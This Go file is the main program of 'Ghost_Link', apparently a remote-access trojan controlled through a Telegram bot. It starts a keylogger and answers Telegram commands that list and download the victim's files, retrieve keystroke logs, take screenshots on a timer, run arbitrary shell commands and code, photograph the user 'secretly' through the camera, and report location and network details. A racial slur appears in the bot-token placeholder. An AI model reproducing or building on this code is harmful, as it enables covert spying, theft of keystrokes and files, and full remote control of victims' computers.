package main

import (
	"log"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"ghost_link/utilities"
)

const botToken = "YOUR_KEY_NIGGAH" // Replace with your bot token

// startKeylogger starts the keylogger in a separate goroutine.
func startKeylogger() {
	go utilities.StartKeylogger()
}

// main initializes the Telegram bot and handles updates.
func main() {
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatalf("Failed to create bot: %v", err)
	}

	bot.Debug = false
	log.Printf("Authorized on account %s", bot.Self.UserName)

	// Start the keylogger
	startKeylogger()

	// Set up the update channel
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := bot.GetUpdatesChan(u)

	// Process updates
	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatID := update.Message.Chat.ID
		text := update.Message.Text

		switch {
		case text == "/start":
			message := `Welcome to Ghost_Link! Here's what I can do:
- Remote file access commands:
  /ls - List files and folders
  /cd <folder> - Move to a folder
  /cdx - Move back to the previous folder
  /get <file/folder> - Download a file or folder
- Keylogger commands:
  /get_log - Retrieve the log file
  /clear_log - Clear the log file
- Screenshot commands:
  /screenshot - Capture a screenshot
  /screenshot_frequency <seconds> - Set auto-screenshot frequency
  /auto_screenshot - Start auto-screenshot
  /stop_screenshot - Stop auto-screenshot
- Remote code execution commands:
  /run <command> - Execute a shell command
  /code <language> <code> - Execute code (Python/Bash).
- Camera command:
  /camera - Capture a photo secretly.
- Location command:
  /getlocation - Get location, IP, network details.`
			bot.Send(tgbotapi.NewMessage(chatID, message))

		case strings.HasPrefix(text, "/ls"):
			utilities.HandleListCommand(bot, chatID)

		case strings.HasPrefix(text, "/cdx"):
			utilities.HandleMoveBackCommand(bot, chatID)

		case strings.HasPrefix(text, "/cd "):
			folder := strings.TrimSpace(strings.TrimPrefix(text, "/cd "))
			utilities.HandleMoveToFolderCommand(bot, chatID, folder)

		case strings.HasPrefix(text, "/get "):
			name := strings.TrimSpace(strings.TrimPrefix(text, "/get "))
			utilities.HandleGetCommand(bot, chatID, name)

		case text == "/stop":
			bot.Send(tgbotapi.NewMessage(chatID, "Transmission stopped."))
			return

		case text == "/get_log":
			utilities.HandleGetLog(bot, chatID)

		case text == "/clear_log":
			utilities.HandleClearLog(bot, chatID)

		case text == "/screenshot":
			utilities.HandleScreenshot(bot, chatID)

		case strings.HasPrefix(text, "/screenshot_frequency"):
			freq := strings.TrimSpace(strings.TrimPrefix(text, "/screenshot_frequency "))
			utilities.SetScreenshotFrequency(bot, chatID, freq)

		case text == "/auto_screenshot":
			utilities.StartAutoScreenshot(bot, chatID)

		case text == "/stop_screenshot":
			utilities.StopAutoScreenshot(bot, chatID)

		case strings.HasPrefix(text, "/run "):
			command := strings.TrimSpace(strings.TrimPrefix(text, "/run "))
			utilities.ExecuteShellCommand(bot, chatID, command)

		case strings.HasPrefix(text, "/code "):
			args := strings.TrimSpace(strings.TrimPrefix(text, "/code "))
			parts := strings.SplitN(args, " ", 2)
			if len(parts) < 2 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid format. Use: /code <language> <code>"))
				break
			}
			language := parts[0]
			code := parts[1]
			utilities.ExecuteCode(bot, chatID, language, code)

		case text == "/camera":
			utilities.HandleCameraCommand(bot, chatID)

		case text == "/getlocation":
			utilities.HandleLocationCommand(bot, chatID)
		

		default:
			bot.Send(tgbotapi.NewMessage(chatID, "Invalid command."))
		}
	}
}
